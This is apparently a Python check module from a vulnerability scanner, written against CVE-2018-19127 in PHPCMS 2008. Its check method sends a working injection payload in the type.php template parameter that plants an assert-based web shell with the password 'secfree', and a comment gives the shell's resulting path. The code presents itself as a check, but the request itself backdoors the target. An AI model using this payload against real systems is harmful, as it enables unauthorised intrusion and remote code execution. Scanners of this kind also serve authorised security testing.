#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_useragent

class CVE_2018_19127_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-19127 命令注入漏洞',
            'description': 'CVE-2018-19127 命令注入漏洞,影响范围为: PHPCMS 2008',
            'date': '2018-11-09',
            'exptype': 'check',
            'type': 'Command Injection'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        url = self.url + "/type.php?template=tag_(){};@unlink(FILE);assert($_POST[secfree]);{//../rss"
        try:
            req = await request.get(url, headers = self.headers)
            result = await req.text()
            c = re.findall(r"function.assert'>(.+?)</a>", result)
            if c[0] == "function.assert":
                # print('存在CVE-2018-19127漏洞,WebShell地址为:' + self.url + '/data/cache_template/rss.tpl.php|secfree')
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    import asyncio
    CVE_2018_19127 = CVE_2018_19127_BaseVerify("https://127.0.0.1")
    asyncio.run(CVE_2018_19127.check())